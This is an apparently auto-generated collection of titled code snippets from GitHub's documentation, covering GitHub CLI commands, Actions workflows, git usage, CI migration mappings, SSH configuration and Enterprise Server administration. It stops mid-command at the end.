(Shell)\nDESCRIPTION: This command authenticates the user to the GitHub CLI. This is a prerequisite for using the GitHub Models CLI extension. It initiates the authentication flow, allowing the CLI to access GitHub resources on behalf of the user.\nSOURCE: https://github.com/github/docs/blob/main/content/github-models/integrating-ai-models-into-your-development-workflow.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh auth login\n```\n\n----------------------------------------\n\nTITLE: Setting template folder for Flask app\nDESCRIPTION: This code shows how to specify the correct template folder when creating the Flask app using the `template_folder` parameter.  It resolves the `jinja2.exceptions.TemplateNotFound` error.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/using-copilot-to-migrate-a-project.md#_snippet_5\n\nLANGUAGE: python\nCODE:\n```\napp = Flask(__name__, template_folder='template')\n```\n\n----------------------------------------\n\nTITLE: Cloning a Repository using GitHub CLI with URL\nDESCRIPTION: This snippet shows how to clone a repository using the GitHub URL with the `gh repo clone` command. It utilizes the HTTPS URL for cloning the specified repository.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/cloning-a-repository.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh repo clone https://github.com/PATH-TO/REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Using Databases/Service Containers in CircleCI\nDESCRIPTION: This snippet illustrates CircleCI's configuration for utilizing databases and service containers. It defines a job (`ruby-26`) that uses Docker images for Ruby and PostgreSQL, setting environment variables for database connection details. Steps include checking out code, installing dependencies, waiting for the database to be available, setting up the environment, setting up the database, and running tests.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-circleci-to-github-actions.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n---\nversion: 2.1\n\njobs:\n\n  ruby-26:\n    docker:\n      - image: circleci/ruby:2.6.3-node-browsers-legacy\n        environment:\n          PGHOST: localhost\n          PGUSER: administrate\n          RAILS_ENV: test\n      - image: postgres:10.1-alpine\n        environment:\n          POSTGRES_USER: administrate\n          POSTGRES_DB: ruby26\n          POSTGRES_PASSWORD: \"\"\n\n    working_directory: ~/administrate\n\n    steps:\n      - checkout\n\n      # Bundle install dependencies\n      - run: bundle install --path vendor/bundle\n\n      # Wait for DB\n      - run: dockerize -wait tcp://localhost:5432 -timeout 1m\n\n      # Setup the environment\n      - run: cp .sample.env .env\n\n      # Setup the database\n      - run: bundle exec rake db:setup\n\n      # Run the tests\n      - run: bundle exec rake\n\nworkflows:\n  version: 2\n  build:\n    jobs:\n      - ruby-26\n...\n\n- attach_workspace:\n    at: /tmp/workspace\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on discussion comment events\nDESCRIPTION: This code snippet shows how to trigger a GitHub Actions workflow when a comment on a discussion is created or deleted. The `on` keyword specifies the `discussion_comment` event, and the `types` keyword filters for specific activity types: `created` and `deleted`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  discussion_comment:\n    types: [created, deleted]\n```\n\n----------------------------------------\n\nTITLE: Changing items per page using curl\nDESCRIPTION: This curl command demonstrates how to use the `per_page` query parameter to control the number of results returned on a single page from the GitHub API.  The `--include` flag is used to include the response headers. The Accept header specifies the desired media type.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/using-pagination-in-the-rest-api.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --include --request GET \\\n--url \"https://api.github.com/repos/octocat/Spoon-Knife/issues?per_page=2\" \\\n--header \"Accept: application/vnd.github+json\"\n```\n\n----------------------------------------\n\nTITLE: Accessing Files from Container Action Workflow\nDESCRIPTION: This YAML workflow file demonstrates how to access files created by a container action. It defines a job that runs on Ubuntu, checks out the repository, runs a containerized build action, and uploads the build artifacts using the `action-upload-artifact` action. It assumes that the container action outputs the artifacts to the `/github/workspace` directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-docker-container-action.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Output build artifacts to /github/workspace on the container.\n      - name: Containerized Build\n        uses: ./.github/actions/my-container-action\n\n      - name: Upload Build Artifacts\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: workspace_artifacts\n          path: {% raw %}${{ github.workspace }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Merging Changes into a Local Branch with Git\nDESCRIPTION: This snippet shows how to merge changes from a remote-tracking branch into your local branch using the `git merge` command. `REMOTE-NAME/BRANCH-NAME` specifies the remote branch to be merged into the current local branch.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/getting-changes-from-a-remote-repository.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ git merge REMOTE-NAME/BRANCH-NAME\n# Merges updates made online with your local work\n```\n\n----------------------------------------\n\nTITLE: Committing the Git LFS Configuration File\nDESCRIPTION: This snippet adds the `.lfsconfig` file to the repository and commits it with a message. This ensures that all users have the same LFS configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-repositories-in-your-enterprise/configuring-git-large-file-storage-for-your-enterprise.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngit add .lfsconfig\ngit commit -m \"Adding LFS config file\"\n```\n\n----------------------------------------\n\nTITLE: Adding SSH Key with Apple's ssh-add\nDESCRIPTION: This command adds an SSH private key to the ssh-agent using the Apple version of `ssh-add`, which supports macOS keychain integration. The `--apple-use-keychain` option stores the passphrase in the keychain. Replace `~/.ssh/id_ed25519` with the actual path to your private key file.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-ssh-add-illegal-option----apple-use-keychain.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n/usr/bin/ssh-add --apple-use-keychain ~/.ssh/id_ed25519\n```\n\n----------------------------------------\n\nTITLE: Cloning a Git Repository using git clone\nDESCRIPTION: This shell command clones a Git repository from a remote URL to your local machine. The URL points to the remote repository. Replace `https://{% data variables.product.product_url %}/YOUR-USERNAME/YOUR-REPOSITORY` with the actual repository URL you want to clone.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/command_line/git-clone-url.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone https://{% data variables.product.product_url %}/YOUR-USERNAME/YOUR-REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Mapping GITLAB_CI to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `GITLAB_CI` to the GitHub Actions equivalent `${{ github.actions }}`. Checks whether the runner is on GitHub Actions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_50\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.actions }}\n```\n\n----------------------------------------\n\nTITLE: Setting Maximum and Minimum Number of Runners\nDESCRIPTION: This snippet configures both the maximum and minimum number of runners by setting the `maxRunners` and `minRunners` properties in the `values.yaml` file. This provides a defined scaling range for the runner scale set. The value of `minRunners` must be less than or equal to `maxRunners`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\n## maxRunners is the max number of runners the auto scaling runner set will scale up to.\nmaxRunners: 30\n\n## minRunners is the min number of idle runners. The target number of runners created will be\n## calculated as a sum of minRunners and the number of jobs assigned to the scale set.\nminRunners: 20\n```\n\n----------------------------------------\n\nTITLE: OAuth Authorization URL Example\nDESCRIPTION: This example shows how to construct an OAuth authorization URL with specific scopes requested. It demonstrates how to include multiple scopes by separating them with the `%20` URL encoding for a space. The example includes `client_id`, and the `scope` parameters `user` and `repo_deployment`.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/scopes-for-oauth-apps.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nhttps://github.com/login/oauth/authorize?\n  client_id=...&\n  scope=user%20repo_deployment\n```\n\n----------------------------------------\n\nTITLE: Migrating GitLab Pipeline to GitHub Actions Workflow (Shell)\nDESCRIPTION: This command migrates a GitLab pipeline to a GitHub Actions workflow. It requires the `gh actions-importer` tool to be installed and configured. The command specifies the target GitHub repository URL, output directory for the converted workflow, GitLab namespace, and GitLab project name.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer migrate gitlab --target-url https://github.com/:owner/:repo --output-dir tmp/migrate --namespace my-gitlab-namespace --project my-gitlab-project\n```\n\n----------------------------------------\n\nTITLE: Changing Machine Type with GitHub CLI\nDESCRIPTION: This command uses the GitHub CLI to change the machine type of a codespace. The `MACHINE-TYPE-NAME` placeholder should be replaced with the desired machine type. The user will be prompted to select the target codespace.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-machine-type-for-your-codespace.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace edit --machine MACHINE-TYPE-NAME\n```\n\n----------------------------------------\n\nTITLE: Configuring Gradle Groovy for single package\nDESCRIPTION: This snippet demonstrates how to configure Gradle Groovy to publish a single package to GitHub Packages. It defines the repository, URL, and credentials for authentication using a username and token.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-gradle-registry.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nplugins {\n    id(\"maven-publish\")\n}\npublishing {\n    repositories {\n        maven {\n            name = \"GitHubPackages\"\n            url = uri(\"https://{% ifversion fpt or ghec %}maven.pkg.github.com{% else %}REGISTRY_URL{% endif %}/OWNER/REPOSITORY\")\n            credentials {\n                username = project.findProperty(\"gpr.user\") ?: System.getenv(\"USERNAME\")\n                password = project.findProperty(\"gpr.key\") ?: System.getenv(\"TOKEN\")\n            }\n        }\n    }\n    publications {\n        gpr(MavenPublication) {\n            from(components.java)\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Conditional Expressions in Azure Pipelines (YAML)\nDESCRIPTION: This YAML snippet illustrates how to use conditional expressions in Azure Pipelines to control the execution of steps. It uses the `condition` key along with functions like `and` and `eq` to define the conditions based on variable values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  - job: conditional\n    pool:\n      vmImage: 'ubuntu-latest'\n    steps:\n      - script: echo \"This step runs with str equals 'ABC' and num equals 123\"\n        condition: and(eq(variables.str, 'ABC'), eq(variables.num, 123))\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_LABELS to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_LABELS` to the GitHub Actions equivalent `${{ github.event.pull_request.labels }}`. Accesses the labels of a pull request from the event context.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_59\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.labels }}\n```\n\n----------------------------------------\n\nTITLE: Creating a Signed Git Tag\nDESCRIPTION: This command creates a signed Git tag using the `-s` option. The signing process uses GPG, SSH, or S/MIME based on the user's configuration. This provides a way to verify the authenticity of the tag.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/signing-tags.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git tag -s MYTAG\n# Creates a signed tag\n```\n\n----------------------------------------\n\nTITLE: Defining GitHub Actions Workflow with Secrets\nDESCRIPTION: This YAML snippet demonstrates how to define a GitHub Actions workflow that uses a secret named PUBLISH_KEY. The secret is passed as an argument to a custom action, fakeaction/publish@v3. This example highlights the potential risks associated with secrets being accessed and utilized within workflows.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nuses: fakeaction/publish@v3\nwith:\n    key: ${{ secrets.PUBLISH_KEY }}\n```\n\n----------------------------------------\n\nTITLE: Configuring Dependabot for Version and Security Updates (YAML)\nDESCRIPTION: This example demonstrates a `dependabot.yml` configuration that adds reviewers and custom labels to both version updates and security updates. It optionally uses the `groups` customization option to create two groups (`angular` and `production-dependencies`) to group multiple updates into single pull requests. It specifies that the `groups` customization for `angular` applies to security updates only, and that the `groups` customization for `production-dependencies` applies to version updates only.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-security-updates/customizing-dependabot-security-prs.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nupdates:\n  # Keep npm dependencies up to date\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n# Raise all npm pull requests for security and version updates with custom labels\n    labels:\n      - \"npm dependencies\"\n      - \"triage-board\"\n    # Raise all npm pull requests for security and version updates with reviewers\n    reviewers:\n      - \"my-org/team-name\"\n      - \"octocat\"{% ifversion dependabot-grouped-security-updates-config %}\n    groups:\n      angular:\n        # Group security updates for Angular dependencies into a single pull request\n        applies-to: security-updates\n        patterns:\n          - \"@angular*\"\n      production-dependencies:\n        # Group version updates for dependencies of type \"production\" into a single pull request\n        applies-to: version-updates\n        dependency-type: \"production\"{%- endif %}\n```\n\n----------------------------------------\n\nTITLE: Amending commit with git\nDESCRIPTION: This snippet shows how to amend the current commit during a rebase using `git commit --amend`. This requires a properly configured Git repository and being in the middle of an interactive rebase.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/working-with-secret-scanning-and-push-protection/working-with-push-protection-from-the-command-line.md#_snippet_7\n\nLANGUAGE: text\nCODE:\n```\ngit commit --amend\n```\n\n----------------------------------------\n\nTITLE: Suspending a User (Shell)\nDESCRIPTION: Suspends the specified user, preventing them from logging in or accessing repositories, using the `ghe-user-suspend` utility. Replace `USERNAME` with the username to suspend.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_112\n\nLANGUAGE: shell\nCODE:\n```\nghe-user-suspend USERNAME\n```\n\n----------------------------------------\n\nTITLE: Setting Output Parameter using PowerShell\nDESCRIPTION: This PowerShell script sets an output parameter by appending a string to the `$env:GITHUB_OUTPUT` file. The string is formatted as `{name}=value`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_39\n\nLANGUAGE: powershell\nCODE:\n```\n\"{name}=value\" >> $env:GITHUB_OUTPUT\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PIPELINE_ID to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PIPELINE_ID` to the GitHub Actions equivalent `${{ github.repository}}/${{ github.workflow }}`. This constructs the unique ID from the repository and workflow names.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_31\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.repository}}/${{ github.workflow }}\n```\n\n----------------------------------------\n\nTITLE: Liquid Octicon Usage Example\nDESCRIPTION: Illustrates how to reference Octicons in GitHub Docs using Liquid syntax. It provides examples for different scenarios, including when the Octicon is the entire label of a UI element or when it's purely decorative. The `{% raw %}{% octicon ... %}{% endraw %}` syntax is used.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% octicon \"<name of Octicon>\" %}\n{% octicon \"plus\" %}\n{% octicon \"plus\" aria-label=\"Add file\" %}\n\"{%% octicon \"plus\" aria-hidden=\"true\" %} Add file\"{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: OIDC Token Example (JWT)\nDESCRIPTION: This snippet demonstrates the structure of a typical OpenID Connect (OIDC) token, which is a JSON Web Token (JWT) containing claims about the user and request context.  The claims include user ID, audience, issuer, and expiration time.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/using-oidc-with-github-copilot-extensions.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"jti\": \"<unique-token-id>\",\n  \"sub\": \"<github-user-id>\",\n  \"aud\": \"<your-client-id>\",\n  \"iss\": \"https://github.com/login/oauth\",\n  \"nbf\": 1632492967,\n  \"exp\": 1632493867,\n  \"iat\": 1632493567,\n  \"act\": {\n    \"sub\": \"api.copilotchat.com\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Committing, Tagging, and Pushing Action\nDESCRIPTION: These git commands add the action files to the staging area, commit them with a message, create an annotated tag, and push the commit and tags to the remote repository. This publishes the action and makes it available for use in workflows.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-javascript-action.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngit add action.yml index.js node_modules/* package.json package-lock.json README.md\ngit commit -m \"My first action is ready\"\ngit tag -a -m \"My first action release\" v1.1\ngit push --follow-tags\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions workflow using GitHub App token\nDESCRIPTION: This YAML workflow generates and uses a GitHub App token within a GitHub Actions workflow. It uses the 'actions/create-github-app-token' action to generate the token using the APP_ID and APP_PEM secrets. Ensure the GitHub App has the appropriate permissions and that the secrets are correctly configured.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/quickstart.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  workflow_dispatch:\njobs:\n  track_pr:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Generate token\n        id: generate-token\n        uses: actions/create-github-app-token@v1\n        with:\n          app-id: {% raw %}${{ vars.APP_ID }}{% endraw %}\n          private-key: {% raw %}${{ secrets.APP_PEM }}{% endraw %}\n      - name: Use API\n        env:\n          GH_TOKEN: {% raw %}${{ steps.generate-token.outputs.token }}{% endraw %}\n        run: |\n          gh api {% data variables.product.rest_url %}{% data variables.rest.example_request_url %}\n```\n\n----------------------------------------\n\nTITLE: Handling User Input for Banking Operations in Node.js\nDESCRIPTION: The `handleUserChoice()` function processes the user's menu selection.  It uses a `switch` statement to determine which action to perform based on the input. Invalid input prompts the user again.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\nfunction handleUserChoice(choice) {\n    switch (choice) {\n        case '1':\n            viewBalance();\n            break;\n        case '2':\n            creditAccount();\n            break;\n        case '3':\n            debitAccount();\n            break;\n        case '4':\n            continueFlag = 'N';\n            console.log(\"Exiting the program. Goodbye!\");\n            rl.close();\n            break;\n        default:\n            console.log(\"Invalid choice. Please try again.\");\n            promptUser();\n            break;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Importing from Mercurial with git-import-hg-raw (Shell)\nDESCRIPTION: This command makes a raw clone of a Mercurial project, creating a new Git repository with refs in 'refs/import/'. It requires the URL of the source Mercurial project and a path for the temporary repository. Replace `HG-CLONE-URL/PATH/REPO-NAME.git` with the actual Mercurial clone URL and desired repository path.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-from-other-version-control-systems-with-the-administrative-shell.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ git-import-hg-raw HG-CLONE-URL/PATH/REPO-NAME.git\n# Creates a new repository with one or more Git refs in \"refs/import/\" in the specified path.\n```\n\n----------------------------------------\n\nTITLE: Removing passphrase from TLS key file (OpenSSL)\nDESCRIPTION: This snippet demonstrates how to remove the passphrase from a TLS key file using OpenSSL. It involves renaming the original key file and generating a new key without a passphrase using the `openssl rsa` command.  This requires OpenSSL to be installed on the system. The user will be prompted for the key's passphrase.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/troubleshooting-tls-errors.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nmv yourdomain.key yourdomain.key.orig\n```\n\n----------------------------------------\n\nTITLE: Checking file locations with git status\nDESCRIPTION: This snippet shows the usage of `git status` to check the old and new file locations after moving a file within the local repository. It displays the changes that are not yet staged for commit, indicating the deleted file in the old location and the untracked file in the new location. The output guides the user to stage the changes using `git add`.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-files/moving-a-file-to-a-new-location.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git status\n> # On branch YOUR-BRANCH\n> # Changes not staged for commit:\n> #   (use \"git add/rm <file>...\" to update what will be committed)\n> #   (use \"git checkout -- <file>...\" to discard changes in working directory)\n> #\n> #     deleted:    /OLD-FOLDER/IMAGE.PNG\n> #\n> # Untracked files:\n> #   (use \"git add <file>...\" to include in what will be committed)\n> #\n> #     /NEW-FOLDER/IMAGE.PNG\n> #\n> # no changes added to commit (use \"git add\" and/or \"git commit -a\")\n```\n\n----------------------------------------\n\nTITLE: Configuring SSH for HTTPS - Text\nDESCRIPTION: This configuration snippet overrides the default SSH settings to force connections to {% data variables.location.product_location %} to use the SSH server on port 443. It should be added to the `~/.ssh/config` file. This ensures all SSH connections to {% data variables.product.product_url %} use port 443.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/using-ssh-over-the-https-port.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nHost {% data variables.product.product_url %}\n    Hostname ssh.{% data variables.product.product_url %}\n    Port 443\n    User git\n```\n\n----------------------------------------\n\nTITLE: Checking service status on Windows with PowerShell\nDESCRIPTION: This command uses PowerShell's `Get-Service` cmdlet to check the status of the self-hosted runner service on Windows. It selects the `Name` and `Status` properties for display. It requires the service name to be known beforehand.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_10\n\nLANGUAGE: powershell\nCODE:\n```\nPS C:\\actions-runner> Get-Service \"actions.runner.octo-org-octo-repo.runner01.service\" | Select-Object Name, Status\n```\n\n----------------------------------------\n\nTITLE: SSH into Codespace using GitHub CLI\nDESCRIPTION: This command establishes an SSH connection to a running codespace, allowing users to execute commands directly on the remote machine. The `-c` flag specifies the codespace name. GitHub Codespaces automatically generates a local SSH key for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace ssh -c CODESPACE-NAME\n```\n\n----------------------------------------\n\nTITLE: Demoting a Site Admin via Command Line (ghe-user-demote) - Shell\nDESCRIPTION: This snippet demonstrates how to demote a site administrator to a regular user using the `ghe-user-demote` command-line utility. It requires SSH access to the appliance. Replace `USERNAME` with the actual username to be demoted.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/promoting-or-demoting-a-site-administrator.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-user-demote USERNAME\n```\n\n----------------------------------------\n\nTITLE: Cloning a Fork Using GitHub CLI\nDESCRIPTION: This snippet shows how to clone a forked repository using the GitHub CLI. This command simplifies the cloning process. Requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/exploring-projects-on-github/contributing-to-a-project.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh repo fork REPOSITORY --clone=true\n```\n\n----------------------------------------\n\nTITLE: Conditional job execution based on pull request review request (YAML)\nDESCRIPTION: This snippet shows how to conditionally execute a job in a GitHub Actions workflow based on the team requested in a pull request review. It uses the `github.event.requested_team.name` context in an `if` condition.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_23\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  pull_request:\n    types: [review_requested]\njobs:\n  specific_review_requested:\n    runs-on: ubuntu-latest\n    if: {% raw %}${{ github.event.requested_team.name == 'octo-team'}}{% endraw %}\n    steps:\n      - run: echo 'A review from octo-team was requested'\n```\n\n----------------------------------------\n\nTITLE: Adding to System Path - PowerShell\nDESCRIPTION: This PowerShell script adds the user's `$env:HOMEPATH/.local/bin` directory to the system `PATH` variable in a GitHub Actions workflow. It uses `Out-File` with the `-Append` parameter to add the directory to the `$env:GITHUB_PATH` environment variable, making executables in that directory accessible to subsequent actions in the job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_53\n\nLANGUAGE: powershell\nCODE:\n```\n\"$env:HOMEPATH/.local/bin\" | Out-File -FilePath \"$env:GITHUB_PATH\" -Append\n```\n\n----------------------------------------\n\nTITLE: Restoring GitHub Enterprise Server (ghe-restore)\nDESCRIPTION: This command restores GitHub Enterprise Server from a backup snapshot. It overwrites the data on the target host with the data from the specified snapshot. Important flags include `-c` to overwrite settings and `-s` to select a specific snapshot.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/backing-up-and-restoring-your-instance/configuring-backups-on-your-instance.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n$ ghe-restore -c 169.154.1.1\n> Checking for leaked keys in the backup snapshot that is being restored ...\n> * No leaked keys found\n> Connect 169.154.1.1:122 OK (v2.9.0)\n\n> WARNING: All data on GitHub Enterprise appliance 169.154.1.1 (v2.9.0)\n>          will be overwritten with data from snapshot 20170329T150710.\n> Please verify that this is the correct restore host before continuing.\n> Type 'yes' to continue: yes\n\n> Starting restore of 169.154.1.1:122 from snapshot 20170329T150710\n# ...output truncated\n> Completed restore of 169.154.1.1:122 from snapshot 20170329T150710\n> Visit https://169.154.1.1/setup/settings to review appliance configuration.\n```\n\n----------------------------------------\n\nTITLE: Setting Proxy Environment Variables (Shell)\nDESCRIPTION: Illustrates how to set environment variables for configuring a HTTP proxy. `OCTOKIT_PROXY` is used for GitHub.com, and `HTTP_PROXY` (or `HTTPS_PROXY`) is used for other servers. Authentication can be included in the proxy URL.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\nexport OCTOKIT_PROXY=https://proxy.example.com:8443\nexport HTTPS_PROXY=$OCTOKIT_PROXY\n```\n\n----------------------------------------\n\nTITLE: Fetch Migration Status with GET Request (Shell)\nDESCRIPTION: This snippet shows how to fetch the status of a migration using a GET request to the GitHub Migrations API. It requires an access token for authentication and the unique ID of the migration. The response indicates whether the migration is pending, exporting, exported, or failed.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-githubcom.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: Bearer GITHUB_ACCESS_TOKEN\" \\\n-H \"Accept: application/vnd.github+json\" \\\nhttps://api.github.com/orgs/ORG_NAME/migrations/ID\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Connect GHE.com - Shell\nDESCRIPTION: This snippet configures the GitHub Enterprise Server instance to connect to GitHub Enterprise Cloud for GitHub Connect. It enables the connection and specifies the subdomain for the enterprise on GHEC. It requires administrative SSH access to the GHE instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-github-connect/enabling-github-connect-for-ghecom.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.github.github-connect-ghe-com-enabled true\nghe-config app.github.github-connect-ghe-com-subdomain \"SUBDOMAIN\"\n```\n\n----------------------------------------\n\nTITLE: User Qualifier in Code Search\nDESCRIPTION: This snippet demonstrates how to use the `user:` qualifier to search for files within a personal account. It searches for files within the octocat user's repositories.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_11\n\nLANGUAGE: text\nCODE:\n```\nuser:octocat\n```\n\n----------------------------------------\n\nTITLE: Listing GitHub issues using gh issue list\nDESCRIPTION: This command lists the most recently created open issues for the specified repository. It accepts filters such as assignee and author. Requires the repository owner and name.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ngh issue list --repo OWNER/REPO\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh issue list --assignee \"@me\"\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh issue list --author monalisa\n```\n\n----------------------------------------\n\nTITLE: Adding SSH Key with Title using GitHub CLI\nDESCRIPTION: This snippet adds an SSH key to your GitHub account using the `gh ssh-key add` command, including a title for the new key.  The `-t` or `--title` flag is used to provide a descriptive label. This helps in managing multiple SSH keys.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/adding-a-new-ssh-key-to-your-github-account.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh ssh-key 